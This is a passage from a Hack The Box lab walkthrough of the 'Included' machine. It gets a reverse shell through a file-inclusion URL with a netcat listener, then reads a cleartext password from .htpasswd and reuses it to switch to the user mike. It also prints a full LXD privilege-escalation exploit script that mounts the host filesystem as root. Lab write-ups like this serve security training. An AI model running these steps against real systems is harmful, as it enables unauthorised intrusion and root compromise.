</span></span><span class=line><span class=cl>Sent <span class=m>5685</span> bytes in 0.2 seconds
</span></span><span class=line><span class=cl>tftp&gt; ^C
</span></span><span class=line><span class=cl>tftp&gt; ┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>and with a <strong>netcat</strong> listener started in an other <strong>terminal</strong>,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p>all that&rsquo;s left to do is to <strong>access it</strong> so that our <strong>target</strong> <strong>runs</strong> it. We can do this by simply <strong>loading</strong> our script in our browser via - <em>http://$rhost/?file=/var/lib/tftpboot/revshell.php</em> -.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point//tier_2/included/accessing-rev-shell.png alt=accessing-rev-shell title=accessing-rev-shell></p><p>Heading over to our <strong>netcat listener</strong>, we are welcomed with a <strong>shell access</strong> with the privileges of the <em>www-data</em> user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.112.221.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.112.221:56704.
</span></span><span class=line><span class=cl>Linux included 4.15.0-151-generic <span class=c1>#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 16:03:41 up  2:01,  <span class=m>0</span> users,  load average: 0.00, 0.00, 0.00
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>/bin/sh: 0: can<span class=err>&#39;</span>t access tty<span class=p>;</span> job control turned off
</span></span></code></pre></div><p>But since this <strong>shell connection</strong> is quite unstable, we first <strong>stabilize</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ which python
</span></span><span class=line><span class=cl>$ which python3
</span></span><span class=line><span class=cl>/usr/bin/python3
</span></span><span class=line><span class=cl>$ python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>www-data@included:/$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>www-data@included:/$ ^Z
</span></span><span class=line><span class=cl><span class=o>[</span>1<span class=o>]</span>+  Stopped                 nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
</span></span><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>www-data@included:/$
</span></span></code></pre></div><p>Looking around a bit, we realize that we do NOT have <strong>permission</strong> to view the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@included:/$ <span class=nb>pwd</span>
</span></span><span class=line><span class=cl>/
</span></span><span class=line><span class=cl>www-data@included:/$ ls -hla
</span></span><span class=line><span class=cl>total 100K
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>24</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>24</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>26</span>  <span class=m>2021</span> bin
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>3</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> boot
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> cdrom
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>17</span> root root 3.9K May <span class=m>23</span> 14:01 dev
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>98</span> root root 4.0K Jul <span class=m>26</span>  <span class=m>2021</span> etc
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>3</span> root root 4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> home
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>34</span> Jul <span class=m>26</span>  <span class=m>2021</span> initrd.img -&gt; boot/initrd.img-4.15.0-151-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>34</span> Oct <span class=m>11</span>  <span class=m>2021</span> initrd.img.old -&gt; boot/initrd.img-4.15.0-151-generic
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>21</span> root root 4.0K Jul <span class=m>26</span>  <span class=m>2021</span> lib
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Jul <span class=m>26</span>  <span class=m>2021</span> lib64
</span></span><span class=line><span class=cl>drwx------   <span class=m>2</span> root root  16K Mar  <span class=m>5</span>  <span class=m>2020</span> lost+found
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> media
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Aug  <span class=m>5</span>  <span class=m>2019</span> mnt
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> opt
</span></span><span class=line><span class=cl>dr-xr-xr-x <span class=m>134</span> root root    <span class=m>0</span> May <span class=m>23</span> 14:01 proc
</span></span><span class=line><span class=cl>drwx------   <span class=m>7</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> root
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>25</span> root root  <span class=m>880</span> May <span class=m>23</span> 14:02 run
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root  12K Jul <span class=m>26</span>  <span class=m>2021</span> sbin
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>4</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> snap
</span></span><span class=line><span class=cl>drwxr-xr-x   <span class=m>2</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> srv
</span></span><span class=line><span class=cl>dr-xr-xr-x  <span class=m>13</span> root root    <span class=m>0</span> May <span class=m>23</span> 14:01 sys
</span></span><span class=line><span class=cl>drwxrwxrwt   <span class=m>2</span> root root 4.0K May <span class=m>23</span> 14:02 tmp
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>11</span> root root 4.0K Jul <span class=m>26</span>  <span class=m>2021</span> usr
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>14</span> root root 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> var
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>31</span> Jul <span class=m>26</span>  <span class=m>2021</span> vmlinuz -&gt; boot/vmlinuz-4.15.0-151-generic
</span></span><span class=line><span class=cl>lrwxrwxrwx   <span class=m>1</span> root root   <span class=m>31</span> Oct <span class=m>11</span>  <span class=m>2021</span> vmlinuz.old -&gt; boot/vmlinuz-4.15.0-151-generic
</span></span><span class=line><span class=cl>www-data@included:/$ <span class=nb>cd</span> home/
</span></span><span class=line><span class=cl>www-data@included:/home$ ls -hla
</span></span><span class=line><span class=cl>total 12K
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span> root root 4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>24</span> root root 4.0K Oct <span class=m>11</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>6</span> mike mike 4.0K Mar <span class=m>11</span>  <span class=m>2020</span> mike
</span></span><span class=line><span class=cl>www-data@included:/home$ <span class=nb>cd</span> mike/
</span></span><span class=line><span class=cl>www-data@included:/home/mike$ ls -hlag
</span></span><span class=line><span class=cl>total 44K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> mike 4.0K Mar <span class=m>11</span>  <span class=m>2020</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root 4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>lrwxrwxrwx <span class=m>1</span> mike    <span class=m>9</span> Mar  <span class=m>5</span>  <span class=m>2020</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> mike  <span class=m>220</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> mike   <span class=m>15</span> Mar  <span class=m>5</span>  <span class=m>2020</span> .bash_profile
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> mike 3.7K Apr  <span class=m>4</span>  <span class=m>2018</span> .bashrc
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> mike 4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> .cache
</span></span><span class=line><span class=cl>drwxr-x--- <span class=m>3</span> mike 4.0K Mar <span class=m>10</span>  <span class=m>2020</span> .config
</span></span><span class=line><span class=cl>drwx------ <span class=m>3</span> mike 4.0K Mar  <span class=m>5</span>  <span class=m>2020</span> .gnupg
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> mike 4.0K Mar  <span class=m>9</span>  <span class=m>2020</span> .local
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> mike  <span class=m>807</span> Apr  <span class=m>4</span>  <span class=m>2018</span> .profile
</span></span><span class=line><span class=cl>-r-------- <span class=m>1</span> mike   <span class=m>33</span> Mar  <span class=m>9</span>  <span class=m>2020</span> user.txt
</span></span><span class=line><span class=cl>www-data@included:/home/mike$
</span></span></code></pre></div><p>Therefore, we need <strong>upgrade</strong> our <strong>privileges</strong>. Taking a quick look at the <strong>web server&rsquo;s</strong> installation directory can sometimes lead to <strong>lateral movement</strong>, considering, that quite often the <strong>source files</strong> found there are prone to leak some <strong>clear-text credentials</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@included:/var/www/html$ ls -hlag
</span></span><span class=line><span class=cl>total 88K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>4</span> root     4.0K Oct <span class=m>13</span>  <span class=m>2021</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root     4.0K Apr <span class=m>23</span>  <span class=m>2021</span> ..
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data  <span class=m>212</span> Apr <span class=m>23</span>  <span class=m>2021</span> .htaccess
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data   <span class=m>17</span> Apr <span class=m>23</span>  <span class=m>2021</span> .htpasswd
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data  14K Apr <span class=m>29</span>  <span class=m>2014</span> default.css
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> fonts
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data  20K Apr <span class=m>29</span>  <span class=m>2014</span> fonts.css
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data 3.7K Oct <span class=m>13</span>  <span class=m>2021</span> home.php
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> www-data 4.0K Apr <span class=m>23</span>  <span class=m>2021</span> images
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data  <span class=m>145</span> Oct <span class=m>13</span>  <span class=m>2021</span> index.php
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> www-data  17K Apr <span class=m>29</span>  <span class=m>2014</span> license.txt
</span></span><span class=line><span class=cl>www-data@included:/var/www/html$
</span></span></code></pre></div><p>We are lucky. The <em>.htpasswd</em> file which is used to store usernames and passwords for basic HTTP authentication <strong>contains</strong> a <strong>password</strong> for the <em>mike</em> user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@included:/var/www/html$ cat .htaccess 
</span></span><span class=line><span class=cl>RewriteEngine On
</span></span><span class=line><span class=cl>RewriteCond %<span class=o>{</span>THE_REQUEST<span class=o>}</span> ^GET.*index<span class=se>\.</span>php <span class=o>[</span>NC<span class=o>]</span>
</span></span><span class=line><span class=cl>RewriteRule <span class=o>(</span>.*?<span class=o>)</span>index<span class=se>\.</span>php/*<span class=o>(</span>.*<span class=o>)</span> /<span class=nv>$1$2</span> <span class=o>[</span><span class=nv>R</span><span class=o>=</span>301,NE,L<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=c1>#&lt;Files index.php&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#AuthType Basic</span>
</span></span><span class=line><span class=cl><span class=c1>#AuthUserFile /var/www/html/.htpasswd</span>
</span></span><span class=line><span class=cl><span class=c1>#Require valid-user</span>
</span></span><span class=line><span class=cl>www-data@included:/var/www/html$ cat .htpasswd 
</span></span><span class=line><span class=cl>mike:Sheffield19
</span></span><span class=line><span class=cl>www-data@included:/var/www/html$
</span></span></code></pre></div><p>Since password <strong>reuse</strong> is a common thing, we try the same password on the system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@included:/var/www/html$ su mike
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>mike@included:/var/www/html$
</span></span></code></pre></div><p>Great, it worked!</p><blockquote><p>.htpasswd</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What is the group that user Mike is a part of and can be exploited for Privilege Escalation?</em></p><p>First we list all the <strong>groups</strong> that <em>mike</em> is a member of. There are only <strong>two</strong>: <em>mike</em> and <em>lxd</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mike@included:/var/www/html$ groups
</span></span><span class=line><span class=cl>mike lxd
</span></span><span class=line><span class=cl>mike@included:/var/www/html$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>mike<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>mike<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>mike<span class=o>)</span>,108<span class=o>(</span>lxd<span class=o>)</span>
</span></span><span class=line><span class=cl>mike@included:/var/www/html$
</span></span></code></pre></div><p>A quick <strong>online search</strong> reveals <strong>LXD</strong> as a next generation system container and virtual machine manager. That looks promising.</p><p>But before we continue with exploiting <strong>lxd</strong> we make sure to <strong>grab</strong> the <strong>user flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mike@included:/var/www/html$ cat /home/mike/user.txt 
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>mike@included:/var/www/html$
</span></span></code></pre></div><blockquote><p>lxd</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?</em></p><p>This time we rely on the <strong>exploit database</strong> for finding the <strong>exploit</strong>. We grab it and store it in our working directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ searchsploit lxd
</span></span><span class=line><span class=cl>-------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>-------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Ubuntu 18.04 - <span class=s1>&#39;lxd&#39;</span> Privilege Escalation                     <span class=p>|</span> linux/local/46978.sh
</span></span><span class=line><span class=cl>-------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cp /usr/share/exploitdb/exploits/linux/local/46978.sh .
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ mv 46978.sh lxdprivesc.sh
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Opening it, we are welcomed with clear <strong>instructions</strong> and following them should <strong>elavate our privileges</strong> to <em>root</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat lxdprivesc.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># Authors: Marcelo Vazquez (S4vitar)</span>
</span></span><span class=line><span class=cl><span class=c1>#	   Victor Lasa      (vowkin)</span>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span>
</span></span><span class=line><span class=cl><span class=c1># Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span>
</span></span><span class=line><span class=cl><span class=c1># Step 3: Run this script and you will get root [Victim Machine]</span>
</span></span><span class=line><span class=cl><span class=c1># Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> helpPanel<span class=o>(){</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> -e <span class=s2>&#34;\nUsage:&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> -e <span class=s2>&#34;\t[-f] Filename (.tar.gz alpine file)&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> -e <span class=s2>&#34;\t[-h] Show this help panel\n&#34;</span>
</span></span><span class=line><span class=cl>  <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> createContainer<span class=o>(){</span>
</span></span><span class=line><span class=cl>  lxc image import <span class=nv>$filename</span> --alias alpine <span class=o>&amp;&amp;</span> lxd init --auto
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> -e <span class=s2>&#34;[*] Listing images...\n&#34;</span> <span class=o>&amp;&amp;</span> lxc image list
</span></span><span class=line><span class=cl>  lxc init alpine privesc -c security.privileged<span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>  lxc config device add privesc giveMeRoot disk <span class=nv>source</span><span class=o>=</span>/ <span class=nv>path</span><span class=o>=</span>/mnt/root <span class=nv>recursive</span><span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>  lxc start privesc
</span></span><span class=line><span class=cl>  lxc <span class=nb>exec</span> privesc sh
</span></span><span class=line><span class=cl>  cleanup
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> cleanup<span class=o>(){</span>
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> -en <span class=s2>&#34;\n[*] Removing container...&#34;</span>
</span></span><span class=line><span class=cl>  lxc stop privesc <span class=o>&amp;&amp;</span> lxc delete privesc <span class=o>&amp;&amp;</span> lxc image delete alpine
</span></span><span class=line><span class=cl>  <span class=nb>echo</span> <span class=s2>&#34; [√]&#34;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>set</span> -o nounset
</span></span><span class=line><span class=cl><span class=nb>set</span> -o errexit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>declare</span> -i <span class=nv>parameter_enable</span><span class=o>=</span>0<span class=p>;</span> <span class=k>while</span> <span class=nb>getopts</span> <span class=s2>&#34;:f:h:&#34;</span> arg<span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>  <span class=k>case</span> <span class=nv>$arg</span> in
</span></span><span class=line><span class=cl>    f<span class=o>)</span> <span class=nv>filename</span><span class=o>=</span><span class=nv>$OPTARG</span> <span class=o>&amp;&amp;</span> <span class=nb>let</span> <span class=nv>parameter_enable</span><span class=o>+=</span>1<span class=p>;;</span>
</span></span><span class=line><span class=cl>    h<span class=o>)</span> helpPanel<span class=p>;;</span>
</span></span><span class=line><span class=cl>  <span class=k>esac</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=nv>$parameter_enable</span> -ne <span class=m>1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  helpPanel
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  createContainer
</span></span><span class=line><span class=cl><span class=k>fi</span>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>All that&rsquo;s left for us now is to simply <strong>follow</strong> the <strong>steps</strong>.</p><ul><li>Step 1: Download build-alpine => wget <a href=https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine>https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</a> [Attacker Machine]</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
</span></span><span class=line><span class=cl>--2023-05-23 17:48:43--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
</span></span><span class=line><span class=cl>Resolving raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span>... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
</span></span><span class=line><span class=cl>Connecting to raw.githubusercontent.com <span class=o>(</span>raw.githubusercontent.com<span class=o>)</span><span class=p>|</span>185.199.108.133<span class=p>|</span>:443... connected.
</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... <span class=m>200</span> OK
</span></span><span class=line><span class=cl>Length: <span class=m>8060</span> <span class=o>(</span>7.9K<span class=o>)</span> <span class=o>[</span>text/plain<span class=o>]</span>
</span></span><span class=line><span class=cl>Saving to: ‘build-alpine’
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>build-alpine            100%<span class=o>[===============================</span>&gt;<span class=o>]</span>   7.87K  --.-KB/s    in 0s      
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2023-05-23 17:48:44 <span class=o>(</span>62.6 MB/s<span class=o>)</span> - ‘build-alpine’ saved <span class=o>[</span>8060/8060<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><ul><li>Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ chmod a+x build-alpine 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.75<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-kncdaw3dhs<span class=o>]</span>─<span class=o>[</span>~/included<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ sudo ./build-alpine 
</span></span><span class=line><span class=cl>Determining the latest release... v3.18
</span></span><span class=line><span class=cl>Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64
</span></span><span class=line><span class=cl>Downloading alpine-keys-2.4-r1.apk
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
</span></span><span class=line><span class=cl>tar: Ignoring unknown extended header keyword <span class=s1>&#39;APK-TOOLS.checksum.SHA1&#39;</span>
